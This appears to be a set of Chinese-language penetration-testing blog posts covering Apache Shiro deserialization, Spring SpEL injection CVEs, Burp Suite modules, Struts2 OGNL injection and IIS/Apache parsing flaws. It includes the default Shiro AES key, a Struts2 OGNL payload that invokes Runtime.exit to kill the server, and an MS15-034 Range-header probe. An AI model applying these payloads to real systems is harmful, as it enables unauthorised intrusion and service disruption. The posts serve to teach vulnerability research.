<h2 id="Shrio漏洞原理"><a href="#Shrio漏洞原理" class="headerlink" title="Shrio漏洞原理"></a>Shrio漏洞原理</h2><p>Apache  Shiro框架提供了记住我的功能（RemeberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RemeberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检索RemeberMe cookie的值</span><br><span class="line">Base 64解码</span><br><span class="line">使用AES解密（加密密钥硬编码）</span><br><span class="line">进行反序列化操作（未作过滤处理）</span><br></pre></td></tr></table></figure>

<p>用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–&gt;AES解密–&gt;反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–&gt;AES加密–&gt;Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p>
<h2 id="Shiro序列化利用条件"><a href="#Shiro序列化利用条件" class="headerlink" title="Shiro序列化利用条件"></a>Shiro序列化利用条件</h2><p>由于使用了AES加密，要想成功利用漏洞则需要获取AES的加密密钥，而在shiro1.2.4之前版本中使用的是硬编码，AES加密的密钥默认在代码里。其默认密钥的base64编码后的值为 kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;  ，这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。</p>
<p>目前已经更新了很多版本，但是官方并没有把反序列化漏洞本身解决，而是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该漏洞。但是，目前一些开源系统、教程范例代码都使用固定的编码，也有很多开源项目内部集成了shiro并二次开发，可能会重现低版本shiro的默认固定密钥的风险。例如Guns开源框架内部集成了shiro并进行二次开发，作者自定义密钥并固定，此时用户如果不对密钥进行修改，即使升级shiro版本，也依旧存在固定密钥的风险。这里可以通过搜索引擎和github来收集密钥，提高漏洞检测和利用的成功率。</p>
<p>如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。</p>
<h2 id="Shiro漏洞特征"><a href="#Shiro漏洞特征" class="headerlink" title="Shiro漏洞特征"></a>Shiro漏洞特征</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.在请求包的Cookie中为？remeberMe字段赋任意值</span><br><span class="line">2.返回包中存在set-Cookie：remeberMe=deleteMe</span><br><span class="line">3.URL中有shiro字样</span><br><span class="line">4.有时候服务器不会主动返回remeberMe=deleteMe，直接发包即可</span><br></pre></td></tr></table></figure>



<h2 id="Linux出网环境渗透Shiro-反序列化漏洞"><a href="#Linux出网环境渗透Shiro-反序列化漏洞" class="headerlink" title="Linux出网环境渗透Shiro 反序列化漏洞"></a>Linux出网环境渗透Shiro 反序列化漏洞</h2><p>CVE-2016-4437(Apache Shiro 反序列化漏洞)</p>
<p>漏洞描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。只要rememberMe的AES加密秘钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</span><br></pre></td></tr></table></figure>

<p>漏洞原理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Shiro提供了记住我的功能，关闭浏览器下次打开还知道你是谁，下次访问无需登录，Shiro对rememberMe的Cookie做了加密处理，shiro在CookieRememberMeManager类中将cookie中的remember字段分别进行序列化、AES加密、Base64编码处理</span><br></pre></td></tr></table></figure>

<p>原因分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</span><br></pre></td></tr></table></figure>

<p>漏洞特征</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">返回的包当中Set-cookie中存在rememberme=deleateMe字段</span><br></pre></td></tr></table></figure>



<p>复现流程</p>
<ol>
<li>抓包后将Cookie内容改为remember Me&#x3D;1，若响应包有rememberMe&#x3D;deleteMe，则基本可以确定网站是apache shiro搭建</li>
<li>shiro漏洞工具找到key破解</li>
<li>获得权限</li>
</ol>
<h2 id="Linux不出网环境渗透shiro反序列化漏洞"><a href="#Linux不出网环境渗透shiro反序列化漏洞" class="headerlink" title="Linux不出网环境渗透shiro反序列化漏洞"></a>Linux不出网环境渗透shiro反序列化漏洞</h2><p>不出网攻击使用python3执行shiro-rce脚本</p>
]]></content>
      <categories>
        <category>java框架漏洞</category>
      </categories>
      <tags>
        <tag>Shiro框架漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring框架漏洞</title>
    <url>/2022/01/25/Spring%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Spring框架漏洞总结"><a href="#Spring框架漏洞总结" class="headerlink" title="Spring框架漏洞总结"></a>Spring框架漏洞总结</h1><p>spring是java EE的一个轻量级开源框架，2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL，具有了安全风险。</p>
<h2 id="SpEL是什么"><a href="#SpEL是什么" class="headerlink" title="SpEL是什么"></a>SpEL是什么</h2><p>SpEL(Spring Expression  Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。就使用方法上来看，一共分为三类，分别是直接在注解中使用，在XML文件中使用和直接在代码块中使用。</p>
<h2 id="SpEL原理"><a href="#SpEL原理" class="headerlink" title="SpEL原理"></a>SpEL原理</h2><p><a href="http://rui0.cn/archives/1043">参考链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">表达式：传入的字符串内容。</span><br><span class="line">解析器：将字符串解析为表达式内容。</span><br><span class="line">上下文：表达式对象执行的环境。</span><br></pre></td></tr></table></figure>

<h2 id="Spring框架特征"><a href="#Spring框架特征" class="headerlink" title="Spring框架特征"></a>Spring框架特征</h2><p>1.看web应用的ico小图标，是个小绿叶子</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220329085400267.png" alt="image-20220329085400267"></p>
<p>2.看报错页面</p>
<p>3.wappalyzer插件识别</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220329085605143.png" alt="image-20220329085605143"></p>
<p>4.F12开发者模式看关键字</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220329085655536.png" alt="image-20220329085655536"></p>
<h2 id="Spring-Security-OAuth2-远程命令执行（CVE-2016-4977）"><a href="#Spring-Security-OAuth2-远程命令执行（CVE-2016-4977）" class="headerlink" title="Spring Security OAuth2 远程命令执行（CVE-2016-4977）"></a>Spring Security OAuth2 远程命令执行（CVE-2016-4977）</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring Security OAuth2是Spring框架提供安全认证支持的一个模块。Spring Security OAuth2处理认证请求的时候使用了whitelabel views，response_type参数值会被当作Spring SpEL来执行，攻击者可以在被授权的情况下通过构造response_type值也就是通过构造恶意SpEL表达式可以触发远程代码执行漏洞。故是在需要知道账号密码的前提下才可以利用该漏洞。</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.0.0-2.0.9</span><br><span class="line">1.0.0-1.0.5</span><br></pre></td></tr></table></figure>

<h2 id="Spring-Web-Flow框架远程代码执行-CVE-2017-4971"><a href="#Spring-Web-Flow框架远程代码执行-CVE-2017-4971" class="headerlink" title="Spring Web Flow框架远程代码执行(CVE-2017-4971)"></a>Spring Web Flow框架远程代码执行(CVE-2017-4971)</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring Web Flow是Spring的一个子项目，主要目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力。</p>
<p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring WebFlow 2.4.0 - 2.4.4</span><br></pre></td></tr></table></figure>

<h3 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MvcViewFactoryCreator对象的useSpringBeanBinding参数需要设置为false（默认值）</span><br><span class="line">flow view对象中设置BinderConfiguration对象为空</span><br></pre></td></tr></table></figure>

<h2 id="Spring-Data-Rest远程命令执行命令-CVE-2017-8046"><a href="#Spring-Data-Rest远程命令执行命令-CVE-2017-8046" class="headerlink" title="Spring Data Rest远程命令执行命令(CVE-2017-8046)"></a>Spring Data Rest远程命令执行命令(CVE-2017-8046)</h2><h3 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring-data-rest服务器在处理PATCH请求时，攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。</p>
<h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3</span><br><span class="line">Spring Boot version &lt; 2.0.0M4</span><br><span class="line">Spring Data release trains &lt; Kay-RC3</span><br></pre></td></tr></table></figure>

<h2 id="Spring-Messaging远程命令执行突破-CVE-2018-1270"><a href="#Spring-Messaging远程命令执行突破-CVE-2018-1270" class="headerlink" title="Spring Messaging远程命令执行突破(CVE-2018-1270)"></a>Spring Messaging远程命令执行突破(CVE-2018-1270)</h2><h3 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>spring  messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，STOMP消息代理在处理客户端消息时存在SpEL表达式注入漏洞，在spring  messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用StandardEvaluationContext解析，造成命令执行漏洞。</p>
<h3 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Framework 5.0 - 5.0.5</span><br><span class="line">Spring Framework 4.3 - 4.3.15</span><br><span class="line">已不支持的旧版本仍然受影响</span><br></pre></td></tr></table></figure>

<h2 id="Spring-Data-Commons远程命令执行漏洞-CVE-2018-1273"><a href="#Spring-Data-Commons远程命令执行漏洞-CVE-2018-1273" class="headerlink" title="Spring Data Commons远程命令执行漏洞(CVE-2018-1273)"></a>Spring Data Commons远程命令执行漏洞(CVE-2018-1273)</h2><h3 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring  Data下所有子项目共享的基础框架。Spring Data Commons  在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p>
<h3 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Data Commons 1.13 – 1.13.10 (Ingalls SR10)</span><br><span class="line">Spring Data REST 2.6 – 2.6.10(Ingalls SR10)</span><br><span class="line">Spring Data Commons 2.0 – 2.0.5 (Kay SR5)</span><br><span class="line">Spring Data REST 3.0 – 3.0.5(Kay SR5)</span><br><span class="line">官方已经不支持的旧版本</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java框架漏洞</category>
      </categories>
      <tags>
        <tag>Spring框架漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>burp suit使用指南</title>
    <url>/2022/01/12/burp-suit%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="1-burpsuit"><a href="#1-burpsuit" class="headerlink" title="1.burpsuit"></a>1.burpsuit</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Dashboard（仪表盘新建扫描和实时任务详解）</span><br><span class="line">2.Proxy（代理模块详解）</span><br><span class="line">3.Target（目标详解）</span><br><span class="line">4.Repeater（中继器详解）</span><br><span class="line">5.Intruder（爆破模块详解）</span><br></pre></td></tr></table></figure>

<h3 id="模块详解"><a href="#模块详解" class="headerlink" title="模块详解"></a>模块详解</h3><h4 id="1-Dashboard（仪表盘）新建扫描"><a href="#1-Dashboard（仪表盘）新建扫描" class="headerlink" title="1.Dashboard（仪表盘）新建扫描"></a>1.Dashboard（仪表盘）新建扫描</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tasks，任务框，新建扫描，新建实时任务</span><br><span class="line">Event log，burp出现错误，报告等</span><br><span class="line">Issue activity，任务执行的结果，任务类型。审计，爬行的结果</span><br><span class="line">Advisory，上边每一条记录的详细信息</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328152307494.png" alt="image-20220328152307494"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.爬行和审计</span><br><span class="line">2.爬行 ，爬行页面源码，以及包括的所有url</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爬行范围</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328152832903.png" alt="image-20220328152832903"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每个页面都有自己的值</span><br><span class="line">更改配置user-angent</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328153022910.png" alt="image-20220328153022910"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">页面有登录框</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328152720204.png" alt="image-20220328152720204"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">详细信息，事件日志，请求日志</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328153358775.png" alt="image-20220328153358775"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爬行的结果在Target目录下</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328152502459.png" alt="image-20220328152502459"></p>
<h4 id="2-Dashboard（仪表盘）新建实时任务"><a href="#2-Dashboard（仪表盘）新建实时任务" class="headerlink" title="2.Dashboard（仪表盘）新建实时任务"></a>2.Dashboard（仪表盘）新建实时任务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">新建实时任务</span><br><span class="line">默认的经过Proxy的流量进行爬行跟审计，容易被ban掉ip，拉黑</span><br><span class="line">可以对各个模块经过的流量进行爬行</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328153642307.png" alt="image-20220328153642307"></p>
<h4 id="3-Proxy（代理）详解"><a href="#3-Proxy（代理）详解" class="headerlink" title="3.Proxy（代理）详解"></a>3.Proxy（代理）详解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Options（设置）</span><br><span class="line">设置监听端口，拦截规则设置（post），修改返回包（去掉你不想看的代码），替换（一些黑名单的单词替换）</span><br><span class="line">2.intercept（截断）</span><br><span class="line">改包，丢包（Forword），放包（Drop），拦截（intercept is on），Open Browser（自带的浏览器）</span><br><span class="line">action修改请求方式（change request method）修改编码方式（change body encoding）url编码</span><br><span class="line">3.HTTPhistory</span><br><span class="line">经过Proxy的流量数据都会在这里</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="4-Target（目标）"><a href="#4-Target（目标）" class="headerlink" title="4.Target（目标）"></a>4.Target（目标）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Site map</span><br><span class="line">爬行结果以目录树结构体现出来，过滤MIME-type，过滤文件扩展名（后缀），过滤掉网页的状态码</span><br><span class="line">2.scope（影响全局）</span><br><span class="line">目标范围的配置，url，那些需要检测，哪些不需要</span><br><span class="line">3.lssue Definitions</span><br><span class="line">对一些漏洞的类型，编号什么的</span><br></pre></td></tr></table></figure>

<h4 id="5-Repeater（重复）"><a href="#5-Repeater（重复）" class="headerlink" title="5.Repeater（重复）"></a>5.Repeater（重复）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.更改报文，发送查看，随时退回操作，更改编码</span><br></pre></td></tr></table></figure>

<h4 id="6-intruder（爆破）"><a href="#6-intruder（爆破）" class="headerlink" title="6.intruder（爆破）"></a>6.intruder（爆破）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标识符枚举、提取有用的数据、模糊测试</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Positions（位置选项）</span><br><span class="line">选择攻击方式、添加删除变量</span><br><span class="line">（狙击手）sniper（对变量依次破解，多个标记依次进行）</span><br><span class="line">（攻城锤）battering ram（对变量同时进行破解，多个标记同时进行）</span><br><span class="line">（草叉）pitchfork（每个变量标记对应一个字典，取每个字典的对应项）</span><br><span class="line">（集束炸弹）cluster bomb（每个变量对应一个字典，并且进行交集破解，尝试各种组合）</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328154036172.png" alt="image-20220328154036172"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.Payloads（有效负载选项）</span><br><span class="line">选择变量的位置（Payload sets）、选择密码字典（Payload options）、选择匹配规则（Payload Processing）</span><br><span class="line"></span><br><span class="line">3.Resource Pool(资源池)</span><br><span class="line"></span><br><span class="line">4.Options（选项）</span><br><span class="line">Request Headers（请求头）两个选项，更新Content-length头、设置连接。</span><br><span class="line">Request Engine（请求引擎），设置发送的线程、超市重试等操作、重试的等待时间</span><br><span class="line">Attack Results （攻击结果），设置攻击结果中的捕获的信息</span><br><span class="line">Grep – Match（匹配），在响应中提取响应的有用的信息。</span><br><span class="line">Grep – Payloads（），添加复选框提取出来</span><br><span class="line">Redirections（重定向），跟随重定向，不跟随重定向，指定范围</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>burp suit工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Strut2框架漏洞</title>
    <url>/2022/02/03/Strut2%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Structs2框架漏洞总结"><a href="#Structs2框架漏洞总结" class="headerlink" title="Structs2框架漏洞总结"></a>Structs2框架漏洞总结</h1><p>Struts2是一个基于MVC设计模式的Web应用框架，本质上相当于一个servlet， 会对某些标签属性（比如id）的属性值进行二次表达式解析，因此在某些场景下可能导致远程代码执行漏洞。</p>
<h2 id="Structs2漏洞基础"><a href="#Structs2漏洞基础" class="headerlink" title="Structs2漏洞基础"></a>Structs2漏洞基础</h2><p>Structs2（OGNL表达式语言）</p>
<p>Struts2是apache项目下的一个web 框架，普遍应用于阿里巴巴、京东等互联网、政府、企业门户网站</p>
<p>Struts2是一个基于MVC设计思路的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器来建立模型与视图的数据交互。Struts2是Struts的下一代产品，是在Struts1和WebWork的技术基础上进行了合并的全新的Struts2框架。其全新的Struts2的体系结构与Struts1的体系结构差别巨大。Struts2以WebWork为核心，采用拦截器的机制来处理用户的请求，</p>
<p>这样的设计也使得业务逻辑控制器能够与Servlet API完全脱离开，所以Struts2可以理解为WebWork的更新产品。虽然从Struts1到Struts2有着太大的变化，但是相对于WebWork，Struts2的变化很小。</p>
<p>Apache Struts2是一个基于MVC设计模式的Web应用框架，会对某些标签属性（比如id）的属性值进行二次表达式解析，因此在某些场景下将可能导致远程代码执行。</p>
<h2 id="Structs2漏洞判断标准"><a href="#Structs2漏洞判断标准" class="headerlink" title="Structs2漏洞判断标准"></a>Structs2漏洞判断标准</h2><p>1.在页面的url后面添加&#x2F;struts&#x2F;webconsole.html ，看是否存在</p>
<p>2.原始 URL 为 <a href="https://threathunter.org/%E5%88%99%E6%A3%80%E6%B5%8B%E6%89%80%E7%94%A8%E7%9A%84">https://threathunter.org/则检测所用的</a> URL 为<a href="https://threathunter.org/?actionErrors=1111">https://threathunter.org/?actionErrors=1111</a></p>
<p>如果返回异常，则可以认定目标是基于Structs2构建的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.页面出现404 500</span><br><span class="line">2.页面输出与业务有关错误消息，或者1111被返回到页面</span><br><span class="line">3.页面的内容结构发生改变</span><br><span class="line">4.页面发生了重定向</span><br></pre></td></tr></table></figure>

<h2 id="Structs2漏洞利用原理"><a href="#Structs2漏洞利用原理" class="headerlink" title="Structs2漏洞利用原理"></a>Structs2漏洞利用原理</h2><p>Struts2的核心是使用的webwork框架,处理 action时通过调用底层的getter&#x2F;setter方法来处理http的参数,它将每个http参数声明为一个ONGL(这里是ONGL的介绍)语句。当我们提交一个http参数:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user.address.city=Bishkek&amp;user[&#x27;favoriteDrink&#x27;]=kumys  </span><br></pre></td></tr></table></figure>

<p>ONGL将它转化为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action.getUser().getAddress().setCity(&quot;Bishkek&quot;) </span><br><span class="line">action.getUser().setFavoriteDrink(&quot;kumys&quot;) </span><br></pre></td></tr></table></figure>

<p>这是通过ParametersInterceptor(参数过滤器)来执行的,使用用户提供的HTTP参数调用 ValueStack.setValue()。</p>
<p>为了防范篡改服务器端对象,XWork的ParametersInterceptor不允许参数名中出现“#”字符,但如果使用了Java的 unicode字符串表示\u0023,攻击者就可以绕过保护,修改保护Java方式执行的值:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此处代码有破坏性,请在测试环境执行,严禁用此种方法进行恶意攻击</span><br><span class="line">?(&#x27;\u0023_memberAccess[\&#x27;allowStaticMethodAccess\&#x27;]&#x27;)(meh)=true&amp;(aaa)((&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003d\u0023foo&#x27;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#x27;\u0023rt.exit(1)&#x27;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</span><br><span class="line"> </span><br><span class="line">转义后是这样:</span><br><span class="line">?(&#x27;#_memberAccess[&#x27;allowStaticMethodAccess&#x27;]&#x27;)(meh)=true&amp;(aaa)((&#x27;#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=#foo&#x27;)(#foo=new%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&#x27;#rt.exit(1)&#x27;)(#rt=@java.lang.Runtime@getRuntime()))=1</span><br><span class="line"></span><br><span class="line">OGNL处理时最终的结果就是</span><br><span class="line">java.lang.Runtime.getRuntime().exit(1); //关闭程序,即将web程序关闭 </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java框架漏洞</category>
      </categories>
      <tags>
        <tag>Struts2框架漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>web中间件漏洞总结</title>
    <url>/2022/03/28/web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><p>IS是Internet lnformation Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。lIS目前只适用于Windows系统，不适用于其他操作系统。</p>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h3><h4 id="基于文件名字"><a href="#基于文件名字" class="headerlink" title="基于文件名字"></a>基于文件名字</h4><p>该版本默认将*.asp;.jpg此种格式的文件名，当成asp来解析，原理是服务器默认不解析;及其后面的内容，相当于截断。</p>
<p>另外，IIS6.x除了会将扩展名为.asp的文件解析为asp之外，还默认会将扩展名为.asa，.cdx，.cer解析为asp,</p>
<h4 id="基于文件夹"><a href="#基于文件夹" class="headerlink" title="基于文件夹"></a>基于文件夹</h4><p>该版本默认会将*.asp&#x2F;目录下的所有文件当成Asp解析。</p>
<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>1.限制上传目录执行权限，不允许执行脚本。</p>
<p>2.不允许新建目录。</p>
<p>3.上传的文件重新命名（时间戳+随机数+.jpg等）</p>
<h3 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h3><p>在Fast-CGI运行模式下,在任意文件，例: test.jpg后面加上&#x2F;.php，会将test.jpg 解析为php文件。</p>
<h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><p>配置cgi.fix_pathinfo(php.ini中)为O并重启php-cgi程序</p>
<h2 id="PUT任意文件写入"><a href="#PUT任意文件写入" class="headerlink" title="PUT任意文件写入"></a>PUT任意文件写入</h2><p>IIS Server 在Web服务扩展中开启了WebDAV之后，支持多种请求，配合写入权限，可造成任意文件写入。</p>
<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328190222573.png" alt="image-20220328190222573"></p>
<h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>关闭WebDAV和写权限</p>
<h2 id="IIS短文件漏洞"><a href="#IIS短文件漏洞" class="headerlink" title="IIS短文件漏洞"></a>IIS短文件漏洞</h2><p>1.当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。</p>
<p>2.当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。</p>
<p>目前IIS支持短文件名猜测的HTTP方法主要包括:DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种。</p>
<p>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功。</p>
<p>lIS8.0以下版本需要开启ASP.NET支持，lIS大于等于8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。</p>
<h2 id="HTTP-SYS远程代码执行-MS15-034"><a href="#HTTP-SYS远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS远程代码执行(MS15-034)"></a>HTTP.SYS远程代码执行(MS15-034)</h2><p>影响范围:<br>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1和Windows Server 2012R2</p>
<p>复现：</p>
<p>1.打开IIS页面</p>
<p>2.编辑请求头，增加Range: bytes&#x3D;0-18446744073709551615字段，若返回码状态为416 Requested Range Not Satisfiable，则存在。</p>
<h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>安装修复补丁(KB3042553)</p>
<h2 id="RCE-CVE-2017-7269"><a href="#RCE-CVE-2017-7269" class="headerlink" title="RCE-CVE-2017-7269"></a>RCE-CVE-2017-7269</h2><p>MicrosoftWMndows Server 2003 R2中的nternet信息服务(IIS)6.0中的WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以”lf:&lt;http:  &#x2F;&#x2F;“开头的长标头执行任意代码PROPFIND请求。</p>
<p>影响范围:<br>在Windows 2003 R2 (Microsoft(R)Windows(R) Server 2003,Enterprise Edition Service Pack2〉上使用IIS 6.0并开启WebDAV扩展。</p>
<h3 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h3><p>关闭WebDAV</p>
<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl&#x2F;Python等解释器编译到服务器中。</p>
<h2 id="解析漏洞-1"><a href="#解析漏洞-1" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h3><p>Apache的解析漏洞依赖于一个特性: Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别(不在mime.types文件内)，则继续向左识别，直到识别到合法后缀才进行解析。</p>
